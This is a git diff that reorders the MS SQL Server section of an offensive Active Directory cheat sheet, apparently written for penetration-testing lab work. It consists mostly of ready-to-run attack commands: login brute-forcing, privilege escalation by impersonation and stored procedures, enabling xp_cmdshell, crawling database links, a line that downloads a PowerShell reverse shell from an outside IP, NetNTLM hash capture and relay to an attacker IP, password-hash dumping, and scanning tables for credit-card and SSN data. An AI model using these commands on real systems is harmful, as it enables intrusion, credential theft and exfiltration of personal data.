@@ -1087,7 +1087,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 . .\PowerUpSQL.ps1
 ```
  
-### Check connections
+### Locating and accessing SQL Servers
 #### Discovery of SQL instances (SPN scanning)
 ```
 Get-SQLInstanceDomain
@@ -1105,19 +1105,15 @@ Get-SQLInstanceScanUDP -Computername <COMPUTER LIST>
 ```
 Get-SQLInstanceLocal 
 ```
- 
+
+### Initial foothold
+- Unauthenticated / Local user / Domain user --> SQL Login
 #### Check for weak passwords or default credentials
 - Might want to check for default applications with backend SQL Server express for default instances/credentials those applications use.
 ```
 Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw -Verbose
 ```
  
-#### Blind SQL Server Login Enumeration
-```
-Get-SQLFuzzServerLogin -Instance <COMPUTERNAME>\<INSTANCENAME>
-Get-SQLFuzzDomainAccount -Instance <COMPUTERNAME>\<INSTANCENAME>
-```
-
 #### Check accessibility to SQL servers with current credentials
 ```
 Get-SQLConnectionTestThreaded
@@ -1125,6 +1121,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose
 ```
  
 #### Check accessibility with other user account
+- Might need runas?
 ```
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose -Username <USERNAME> -Password <PASSWORD>
 ```
@@ -1135,59 +1132,47 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose -Username <USER
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
 
-### Database links
-#### Search for links to remote servers
-```
-Get-SQLServerLink -Instance <SQL INSTANCE> -Verbose
-```
-
-#### Crawl links to remote servers
-```
-Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Verbose
-```
-
-#### Crawl links and show servers where we are sysadmin
-```
-Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> | Where-Object -Property sysadmin -Match 1
-```
-
-#### Crawl and try to use xp_cmdshell on every link
-```
-Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami'''
-Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
-```
-
-#### Manually enumerate database links query
-```
-SELECT * FROM master..sysservers
-```
- 
-#### Query a link for links
-```
-SELECT * FROM OPENQUERY("UATSERVER\DB2", 'SELECT * FROM master..sysservers;')
-```
-
-### Audit
+### Privilege Escalation to sysadmin
 #### Audit for issues
 ```
 Invoke-SQLAudit -Verbose -Instance <SQL INSTANCE>
 ```
-
-### Exploitation
+ 
 #### Try to excalate privileges
 ```
 Invoke-SQLEscalatePriv
 ```
  
-#### Impersonation attack
+### SQL Server enumerate login
+- Try weak passwords against the enumerated users!
+#### Blind SQL Server login enum
+```
+SELECT name FROM sys.syslogins;
+SELECT name FROM sys.server_principals;
+ 
+SELECT SUSER_NAME(1)
+SELECT SUSER_NAME(2)
+SELECT SUSER_NAME(3)
+
+Get-SQLFuzzServerLogin -Instance <COMPUTERNAME>\<INSTANCENAME>
+```
+ 
+#### Blind SQL Domain Account Enum.
+```
+-- Get the domain where SQL Server is.--
+SELECT DEFAULT_DOMAIN() as mydomain
+-- Full RID of Domain Admins group.--
+SELECT SUSER_SID('<Identified_Domain>\Domain Admins')
+-- grab the first 48 bytes of the full RID to get domain’s SID. Create a new RID (will be associated with a domain object) by appending a hex number value to the previous SID. --
+SELECT SUSER_NAME(RID) –> Get the domain object name associated to the RID.
+
+Get-SQLFuzzDomainAccount -Instance <COMPUTERNAME>\<INSTANCENAME>
+```
+ 
+### Impersonation attack
 #### Check if impersonation is possible
 ```
 Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug -Exploit
-```
-
-#### Check for impersonation through link
-```
-Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
 ```
 
 #### Check if impersonation is possible
@@ -1226,12 +1211,13 @@ GO
 -- Quickly check what the service account is via xp_cmdshell
 EXEC master..xp_cmdshell 'whoami'
 ```
- 
-### Stored procedure
-- Create stored procedure if you are DB_Owner bot not sysadmin and escalate privs!
-- Stored procedures are sometimes configured to execute as owner, you might are able to edit a procedure.
-- DB must be set as trustworthy
 
+#### Check for impersonation through link
+```
+Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
+```
+ 
+### Create Stored procedure as DB_Owner
 #### Create a stored procedure
 ```
 USE <DB>
@@ -1253,7 +1239,14 @@ EXEC sp_elevate_me
 ```
 SELECT is_srvrolemember('sysadmin')
 ```
- 
+
+#### Automatic execution of stored procedures
+- Found and abused with PowerUpSQL
+```
+invoke-SQLAudit
+invoke-SQLEscalatedPriv
+```
+
 ### Command execution
 ![image](https://user-images.githubusercontent.com/43987245/151711534-6114738f-6c9c-49b2-8c5f-0cb27f5fa6d0.png)
 
@@ -1276,8 +1269,94 @@ select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''s
 ```
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
 ```
+ 
+#### Enable and run xp_cmdshell
+```
+-- Enable show options
+EXEC sp_configure 'show advanced options',1
+RECONFIGURE
+GO
+-- Enable xp_cmdshell
+EXEC sp_configure 'xp_cmdshell',1
+RECONFIGURE
+GO
+-- Quickly check what the service account is via xp_cmdshell
+EXEC master..xp_cmdshell 'whoami'
+```
+ 
+### Database links
+#### Search for links to remote servers
+```
+Get-SQLServerLink -Instance <SQL INSTANCE> -Verbose
+```
+
+#### Crawl links to remote servers
+```
+Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Verbose
+```
+
+#### Crawl links and show servers where we are sysadmin
+```
+Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> | Where-Object -Property sysadmin -Match 1
+```
+
+#### Crawl and try to use xp_cmdshell on every link
+```
+Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami'''
+Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
+```
+
+#### Manually enumerate database links query
+```
+SELECT * FROM master..sysservers
+```
+ 
+#### Query a link for links
+```
+SELECT * FROM OPENQUERY("UATSERVER\DB2", 'SELECT * FROM master..sysservers;')
+```
+ 
+### Privilege escalation Service Accounts
+#### Shared service account
+- If multiple SQL Servers share the same service account. Comprimising one server comprimises them all!
+
+#### UNC PATH INJECTION
+- Public role has access to xp_dirtree and xp_fileexists to abuse UNC PATH INJECTION
+
+#### Capture NetNTLM password hash
+```
+import-module .\PowerUpSQL.ps1
+Import-Module \Scripts\3rdparty\Inveigh.ps1
+Import-Module \Scripts\pending\Get-SQLServiceAccountPwHashes.ps1
+Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp <ATTACKER IP>
+ 
+
+python smbrelayx.py -h <SQL SERVER IP> -c 'powershell empire launcher'
+msf > use auxiliary/admin/mssql/mssql_ntlm_stealer
+set SMBPROXY <ATTACKER IP>
+set RHOST <TARGET IP>
+set GET_PATH <PATH TO SQLI>
+run
+```
 
 ### Data exfiltration
+#### SQLServerPasswordHash
+```
+Get-SQLServerPasswordHash -Verbose -Instance <INSTANCE> -Migrate
+```
+
+ 
+#### Identify Sensitive Data
+```
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Get-SQLColumnSampleDataThreaded -Verbose -Threads 20 -Keyword "credit,creditcard,ssn,bsn,password,wachtwoord" -SampleSize 2 -ValidateCC -NoDefaults
+```
+ 
+#### Identify sensitive data featuring transparent encryption
+```
+Get-SQLInstanceDomain | Get-SQLConnectionTest | Get-SQLDatabaseThreaded -Verbose -Threads 10 -NoDefaults | Where-Object {$_.is_encrypted -eq 'TRUE'}| Get-SQLColumnSampleDataThreaded -Verbose -Threads 20 -Keyword "credit,creditcard,ssn,bsn,password,wachtwoord" -SampleSize 2 -ValidateCC -NoDefaults
+```
+
+### Some queries
 ```
 #When able to connect directy to the instance
 Get-SQLDatabase
@@ -1289,14 +1368,14 @@ Get-SQLQuery -Query "use <DATABASE>; SELECT * from <TABLE>"
 List databases
 Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query 'SELECT name FROM master..sysdatabases;' | Where-Object customquery | Select-Object instance, customquery -ExpandProperty customquery | Select-Object instance, name
 
-List tables
+#List tables
 Get-SQLServerLinkCrawl -Instance <INSTANCE> -QueryTarget AC-DBBUSINESS -Query "SELECT name FROM <DATABASE>..sysobjects WHERE xtype = 'U'" | Select-Object -ExpandProperty customquery
 
-List columns
+#List columns
 
-List the contents of table
+#List the contents of table
 ```
-
+ 
 ### SQL Queries
 #### Check if current user is sysadmin
 ```
@@ -1312,20 +1391,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin','<USER>')
 ```
 SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
 ```
- 
-#### Enable and run xp_cmdshell
-```
--- Enable show options
-EXEC sp_configure 'show advanced options',1
-RECONFIGURE
-GO
--- Enable xp_cmdshell
-EXEC sp_configure 'xp_cmdshell',1
-RECONFIGURE
-GO
--- Quickly check what the service account is via xp_cmdshell
-EXEC master..xp_cmdshell 'whoami'
-```
+
 
 ## Foreign Security Principals
 - A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).
